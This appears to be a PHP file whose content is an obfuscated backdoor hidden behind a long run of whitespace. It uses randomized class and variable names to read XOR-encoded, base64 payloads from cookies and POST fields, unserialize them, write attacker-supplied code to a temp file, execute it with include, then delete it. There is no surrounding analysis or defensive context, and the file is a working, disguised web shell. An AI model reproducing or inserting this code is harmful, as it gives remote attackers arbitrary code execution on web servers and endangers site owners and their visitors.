<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("iefhqze")){class iefhqze{public static $obfypv = "yuxtjkisrgzpzhlu";public static $spnhn = NULL;public function __construct(){$cxtrjiceug = @$_COOKIE[substr(iefhqze::$obfypv, 0, 4)];if (!empty($cxtrjiceug)){$rrbecamfa = "base64";$kaceakn = "";$cxtrjiceug = explode(",", $cxtrjiceug);foreach ($cxtrjiceug as $tfvgcpkyjs){$kaceakn .= @$_COOKIE[$tfvgcpkyjs];$kaceakn .= @$_POST[$tfvgcpkyjs];}$kaceakn = array_map($rrbecamfa . "_decode", array($kaceakn,));$kaceakn = $kaceakn[0] ^ str_repeat(iefhqze::$obfypv, (strlen($kaceakn[0]) / strlen(iefhqze::$obfypv)) + 1);iefhqze::$spnhn = @unserialize($kaceakn);}}public function __destruct(){$this->odhky();}private function odhky(){if (is_array(iefhqze::$spnhn)) {$nefwlfonsf = sys_get_temp_dir() . "/" . crc32(iefhqze::$spnhn["salt"]);@iefhqze::$spnhn["write"]($nefwlfonsf, iefhqze::$spnhn["content"]);include $nefwlfonsf;@iefhqze::$spnhn["delete"]($nefwlfonsf);exit();}}}$mhiyobuu = new iefhqze();$mhiyobuu = NULL;} ?><?php
